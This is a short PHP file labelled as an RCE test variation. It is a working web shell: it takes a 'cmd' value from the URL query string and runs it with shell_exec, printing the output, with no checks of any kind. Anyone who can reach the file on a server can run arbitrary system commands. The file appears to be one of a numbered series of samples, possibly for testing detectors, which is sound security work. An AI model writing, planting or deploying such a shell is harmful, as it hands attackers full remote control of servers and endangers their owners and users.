<?php
// RCE test variation #137
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>